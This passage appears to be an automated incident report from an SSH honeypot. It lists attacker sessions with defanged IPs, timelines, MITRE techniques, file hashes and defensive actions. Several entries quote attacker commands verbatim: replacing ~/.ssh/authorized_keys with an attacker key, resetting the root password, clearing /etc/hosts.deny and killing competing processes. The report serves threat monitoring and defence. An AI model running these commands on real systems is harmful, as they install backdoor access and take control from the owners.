| `2026-06-02 07:45:02` | `cowrie.client.kex` |
| `2026-06-02 07:45:02` | `cowrie.login.success` |
| `2026-06-02 07:45:03` | `cowrie.session.params` |
| `2026-06-02 07:45:03` | `cowrie.command.input` |
| `2026-06-02 07:45:03` | `cowrie.command.failed` |
| `2026-06-02 07:45:03` | `cowrie.log.closed` |
| `2026-06-02 07:45:03` | `cowrie.session.params` |
| `2026-06-02 07:45:03` | `cowrie.command.input` |
| `2026-06-02 07:45:03` | `cowrie.session.file_download` |
| `2026-06-02 07:45:03` | `cowrie.log.closed` |
| `2026-06-02 07:45:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.120.115[.]150` to AbuseIPDB if not already reported
- [ ] Block `45.120.115[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f18d7886e1bf

| Field | Detail |
|---|---|
| **Source IP** | `45.120.115[.]150` |
| **First Seen** | 2026-06-02 07:45 |
| **Last Seen** | 2026-06-02 07:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 07:45:04` | `cowrie.session.connect` |
| `2026-06-02 07:45:04` | `cowrie.client.version` |
| `2026-06-02 07:45:04` | `cowrie.client.kex` |
| `2026-06-02 07:45:04` | `cowrie.login.success` |
| `2026-06-02 07:45:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.120.115[.]150` to AbuseIPDB if not already reported
- [ ] Block `45.120.115[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-042733489184

| Field | Detail |
|---|---|
| **Source IP** | `180.100.217[.]164` |
| **First Seen** | 2026-06-02 07:45 |
| **Last Seen** | 2026-06-02 07:46 |
| **Session Duration** | 38s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:ulLOuPRTqGid"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 07:45:53` | `cowrie.session.connect` |
| `2026-06-02 07:45:53` | `cowrie.client.version` |
| `2026-06-02 07:45:54` | `cowrie.client.kex` |
| `2026-06-02 07:45:56` | `cowrie.login.success` |
| `2026-06-02 07:45:57` | `cowrie.session.params` |
| `2026-06-02 07:45:57` | `cowrie.command.input` |
| `2026-06-02 07:45:57` | `cowrie.command.failed` |
| `2026-06-02 07:45:59` | `cowrie.log.closed` |
| `2026-06-02 07:46:00` | `cowrie.session.params` |
| `2026-06-02 07:46:00` | `cowrie.command.input` |
| `2026-06-02 07:46:00` | `cowrie.session.file_download` |
| `2026-06-02 07:46:00` | `cowrie.log.closed` |
| `2026-06-02 07:46:16` | `cowrie.session.params` |
| `2026-06-02 07:46:16` | `cowrie.command.input` |
| `2026-06-02 07:46:16` | `cowrie.log.closed` |
| `2026-06-02 07:46:17` | `cowrie.session.params` |
| `2026-06-02 07:46:17` | `cowrie.command.input` |
| `2026-06-02 07:46:17` | `cowrie.log.closed` |
| `2026-06-02 07:46:19` | `cowrie.session.params` |
| `2026-06-02 07:46:19` | `cowrie.command.input` |
| `2026-06-02 07:46:19` | `cowrie.session.file_download` |
| `2026-06-02 07:46:19` | `cowrie.log.closed` |
| `2026-06-02 07:46:20` | `cowrie.session.params` |
| `2026-06-02 07:46:20` | `cowrie.command.input` |
| `2026-06-02 07:46:20` | `cowrie.log.closed` |
| `2026-06-02 07:46:21` | `cowrie.session.params` |
| `2026-06-02 07:46:21` | `cowrie.command.input` |
| `2026-06-02 07:46:21` | `cowrie.log.closed` |
| `2026-06-02 07:46:22` | `cowrie.session.params` |
| `2026-06-02 07:46:22` | `cowrie.command.input` |
| `2026-06-02 07:46:22` | `cowrie.command.input` |
| `2026-06-02 07:46:22` | `cowrie.log.closed` |
| `2026-06-02 07:46:22` | `cowrie.session.params` |
| `2026-06-02 07:46:22` | `cowrie.command.input` |
| `2026-06-02 07:46:23` | `cowrie.log.closed` |
| `2026-06-02 07:46:23` | `cowrie.session.params` |
| `2026-06-02 07:46:23` | `cowrie.command.input` |
| `2026-06-02 07:46:24` | `cowrie.log.closed` |
| `2026-06-02 07:46:24` | `cowrie.session.params` |
| `2026-06-02 07:46:24` | `cowrie.command.input` |
| `2026-06-02 07:46:25` | `cowrie.log.closed` |
| `2026-06-02 07:46:25` | `cowrie.session.params` |
| `2026-06-02 07:46:25` | `cowrie.command.input` |
| `2026-06-02 07:46:26` | `cowrie.log.closed` |
| `2026-06-02 07:46:26` | `cowrie.session.params` |
| `2026-06-02 07:46:26` | `cowrie.command.input` |
| `2026-06-02 07:46:27` | `cowrie.log.closed` |
| `2026-06-02 07:46:28` | `cowrie.session.params` |
| `2026-06-02 07:46:28` | `cowrie.command.input` |
| `2026-06-02 07:46:28` | `cowrie.log.closed` |
| `2026-06-02 07:46:29` | `cowrie.session.params` |
| `2026-06-02 07:46:29` | `cowrie.command.input` |
| `2026-06-02 07:46:29` | `cowrie.log.closed` |
| `2026-06-02 07:46:30` | `cowrie.session.params` |
| `2026-06-02 07:46:30` | `cowrie.command.input` |
| `2026-06-02 07:46:30` | `cowrie.log.closed` |
| `2026-06-02 07:46:31` | `cowrie.session.params` |
| `2026-06-02 07:46:31` | `cowrie.command.input` |
| `2026-06-02 07:46:31` | `cowrie.log.closed` |
| `2026-06-02 07:46:32` | `cowrie.session.params` |
| `2026-06-02 07:46:32` | `cowrie.command.input` |
| `2026-06-02 07:46:32` | `cowrie.log.closed` |
| `2026-06-02 07:46:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.100.217[.]164` to AbuseIPDB if not already reported
- [ ] Block `180.100.217[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95508a8119f2

| Field | Detail |
|---|---|
| **Source IP** | `45.120.115[.]150` |
| **First Seen** | 2026-06-02 07:52 |
| **Last Seen** | 2026-06-02 07:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 07:52:54` | `cowrie.session.connect` |
| `2026-06-02 07:52:54` | `cowrie.client.version` |
| `2026-06-02 07:52:54` | `cowrie.client.kex` |
| `2026-06-02 07:52:54` | `cowrie.login.success` |
| `2026-06-02 07:52:54` | `cowrie.session.params` |
| `2026-06-02 07:52:54` | `cowrie.command.input` |
| `2026-06-02 07:52:54` | `cowrie.command.failed` |
| `2026-06-02 07:52:54` | `cowrie.log.closed` |
| `2026-06-02 07:52:54` | `cowrie.session.params` |
| `2026-06-02 07:52:54` | `cowrie.command.input` |
| `2026-06-02 07:52:54` | `cowrie.session.file_download` |
| `2026-06-02 07:52:54` | `cowrie.log.closed` |
| `2026-06-02 07:52:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.120.115[.]150` to AbuseIPDB if not already reported
- [ ] Block `45.120.115[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95981dc75d65

| Field | Detail |
|---|---|
| **Source IP** | `45.120.115[.]150` |
| **First Seen** | 2026-06-02 07:52 |
| **Last Seen** | 2026-06-02 07:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 07:52:56` | `cowrie.session.connect` |
| `2026-06-02 07:52:56` | `cowrie.client.version` |
| `2026-06-02 07:52:56` | `cowrie.client.kex` |
| `2026-06-02 07:52:56` | `cowrie.login.success` |
| `2026-06-02 07:52:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.120.115[.]150` to AbuseIPDB if not already reported
- [ ] Block `45.120.115[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9668b97f4735

| Field | Detail |
|---|---|
| **Source IP** | `45.120.115[.]150` |
| **First Seen** | 2026-06-02 07:54 |
| **Last Seen** | 2026-06-02 07:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 07:54:35` | `cowrie.session.connect` |
| `2026-06-02 07:54:35` | `cowrie.client.version` |
| `2026-06-02 07:54:35` | `cowrie.client.kex` |
| `2026-06-02 07:54:35` | `cowrie.login.success` |
| `2026-06-02 07:54:35` | `cowrie.session.params` |
| `2026-06-02 07:54:35` | `cowrie.command.input` |
| `2026-06-02 07:54:35` | `cowrie.command.failed` |
| `2026-06-02 07:54:35` | `cowrie.log.closed` |
| `2026-06-02 07:54:35` | `cowrie.session.params` |
| `2026-06-02 07:54:35` | `cowrie.command.input` |
| `2026-06-02 07:54:35` | `cowrie.session.file_download` |
| `2026-06-02 07:54:35` | `cowrie.log.closed` |
| `2026-06-02 07:54:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.120.115[.]150` to AbuseIPDB if not already reported
- [ ] Block `45.120.115[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e001f67b3ce2

| Field | Detail |
|---|---|
| **Source IP** | `45.120.115[.]150` |
| **First Seen** | 2026-06-02 07:54 |
| **Last Seen** | 2026-06-02 07:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 07:54:37` | `cowrie.session.connect` |
| `2026-06-02 07:54:37` | `cowrie.client.version` |
| `2026-06-02 07:54:37` | `cowrie.client.kex` |
| `2026-06-02 07:54:37` | `cowrie.login.success` |
| `2026-06-02 07:54:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.120.115[.]150` to AbuseIPDB if not already reported
- [ ] Block `45.120.115[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-185bb831283a

| Field | Detail |
|---|---|
| **Source IP** | `172.203.134[.]70` |
| **First Seen** | 2026-06-02 08:09 |
| **Last Seen** | 2026-06-02 08:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 08:09:58` | `cowrie.session.connect` |
| `2026-06-02 08:09:58` | `cowrie.client.version` |
| `2026-06-02 08:09:58` | `cowrie.client.kex` |
| `2026-06-02 08:09:59` | `cowrie.login.success` |
| `2026-06-02 08:10:00` | `cowrie.session.params` |
| `2026-06-02 08:10:00` | `cowrie.command.input` |
| `2026-06-02 08:10:00` | `cowrie.command.failed` |
| `2026-06-02 08:10:00` | `cowrie.log.closed` |
| `2026-06-02 08:10:01` | `cowrie.session.params` |
| `2026-06-02 08:10:01` | `cowrie.command.input` |
| `2026-06-02 08:10:01` | `cowrie.session.file_download` |
| `2026-06-02 08:10:01` | `cowrie.log.closed` |
| `2026-06-02 08:10:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.203.134[.]70` to AbuseIPDB if not already reported
- [ ] Block `172.203.134[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e882a8820a3

| Field | Detail |
|---|---|
| **Source IP** | `172.203.134[.]70` |
| **First Seen** | 2026-06-02 08:10 |
| **Last Seen** | 2026-06-02 08:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 08:10:05` | `cowrie.session.connect` |
| `2026-06-02 08:10:05` | `cowrie.client.version` |
| `2026-06-02 08:10:05` | `cowrie.client.kex` |
| `2026-06-02 08:10:06` | `cowrie.login.success` |
| `2026-06-02 08:10:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.203.134[.]70` to AbuseIPDB if not already reported
- [ ] Block `172.203.134[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e159f7b389d

| Field | Detail |
|---|---|
| **Source IP** | `172.203.134[.]70` |
| **First Seen** | 2026-06-02 08:13 |
| **Last Seen** | 2026-06-02 08:13 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 08:13:12` | `cowrie.session.connect` |
| `2026-06-02 08:13:12` | `cowrie.client.version` |
| `2026-06-02 08:13:12` | `cowrie.client.kex` |
| `2026-06-02 08:13:13` | `cowrie.login.success` |
| `2026-06-02 08:13:14` | `cowrie.session.params` |
| `2026-06-02 08:13:14` | `cowrie.command.input` |
| `2026-06-02 08:13:14` | `cowrie.command.failed` |
| `2026-06-02 08:13:14` | `cowrie.log.closed` |
| `2026-06-02 08:13:15` | `cowrie.session.params` |
| `2026-06-02 08:13:15` | `cowrie.command.input` |
| `2026-06-02 08:13:15` | `cowrie.session.file_download` |
| `2026-06-02 08:13:15` | `cowrie.log.closed` |
| `2026-06-02 08:13:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.203.134[.]70` to AbuseIPDB if not already reported
- [ ] Block `172.203.134[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b68f5c6e0d1

| Field | Detail |
|---|---|
| **Source IP** | `172.203.134[.]70` |
| **First Seen** | 2026-06-02 08:13 |
| **Last Seen** | 2026-06-02 08:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 08:13:21` | `cowrie.session.connect` |
| `2026-06-02 08:13:21` | `cowrie.client.version` |
| `2026-06-02 08:13:22` | `cowrie.client.kex` |
| `2026-06-02 08:13:23` | `cowrie.login.success` |
| `2026-06-02 08:13:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.203.134[.]70` to AbuseIPDB if not already reported
- [ ] Block `172.203.134[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f383ec0d601

| Field | Detail |
|---|---|
| **Source IP** | `212.87.199[.]64` |
| **First Seen** | 2026-06-02 08:15 |
| **Last Seen** | 2026-06-02 08:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 08:15:20` | `cowrie.session.connect` |
| `2026-06-02 08:15:20` | `cowrie.client.version` |
| `2026-06-02 08:15:20` | `cowrie.client.kex` |
| `2026-06-02 08:15:21` | `cowrie.login.success` |
| `2026-06-02 08:15:21` | `cowrie.session.params` |
| `2026-06-02 08:15:21` | `cowrie.command.input` |
| `2026-06-02 08:15:21` | `cowrie.command.failed` |
| `2026-06-02 08:15:22` | `cowrie.log.closed` |
| `2026-06-02 08:15:22` | `cowrie.session.params` |
| `2026-06-02 08:15:22` | `cowrie.command.input` |
| `2026-06-02 08:15:22` | `cowrie.session.file_download` |
| `2026-06-02 08:15:22` | `cowrie.log.closed` |
| `2026-06-02 08:15:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.87.199[.]64` to AbuseIPDB if not already reported
- [ ] Block `212.87.199[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab4c0bd68133

| Field | Detail |
|---|---|
| **Source IP** | `212.87.199[.]64` |
| **First Seen** | 2026-06-02 08:15 |
| **Last Seen** | 2026-06-02 08:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 08:15:25` | `cowrie.session.connect` |
| `2026-06-02 08:15:25` | `cowrie.client.version` |
| `2026-06-02 08:15:26` | `cowrie.client.kex` |
| `2026-06-02 08:15:26` | `cowrie.login.success` |
| `2026-06-02 08:15:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.87.199[.]64` to AbuseIPDB if not already reported
- [ ] Block `212.87.199[.]64` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-793183f1eab2

| Field | Detail |
|---|---|
| **Source IP** | `172.203.134[.]70` |
| **First Seen** | 2026-06-02 08:19 |
| **Last Seen** | 2026-06-02 08:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 08:19:46` | `cowrie.session.connect` |
| `2026-06-02 08:19:46` | `cowrie.client.version` |
| `2026-06-02 08:19:46` | `cowrie.client.kex` |
| `2026-06-02 08:19:47` | `cowrie.login.success` |
| `2026-06-02 08:19:48` | `cowrie.session.params` |
| `2026-06-02 08:19:48` | `cowrie.command.input` |
| `2026-06-02 08:19:48` | `cowrie.command.failed` |
| `2026-06-02 08:19:48` | `cowrie.log.closed` |
| `2026-06-02 08:19:49` | `cowrie.session.params` |
| `2026-06-02 08:19:49` | `cowrie.command.input` |
| `2026-06-02 08:19:49` | `cowrie.session.file_download` |
| `2026-06-02 08:19:49` | `cowrie.log.closed` |
| `2026-06-02 08:19:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.203.134[.]70` to AbuseIPDB if not already reported
- [ ] Block `172.203.134[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68582adf1dd0

| Field | Detail |
|---|---|
| **Source IP** | `172.203.134[.]70` |
| **First Seen** | 2026-06-02 08:19 |
| **Last Seen** | 2026-06-02 08:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 08:19:52` | `cowrie.session.connect` |
| `2026-06-02 08:19:52` | `cowrie.client.version` |
| `2026-06-02 08:19:52` | `cowrie.client.kex` |
| `2026-06-02 08:19:53` | `cowrie.login.success` |
| `2026-06-02 08:19:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.203.134[.]70` to AbuseIPDB if not already reported
- [ ] Block `172.203.134[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9be18b86d99a

| Field | Detail |
|---|---|
| **Source IP** | `172.203.134[.]70` |
| **First Seen** | 2026-06-02 08:23 |
| **Last Seen** | 2026-06-02 08:23 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
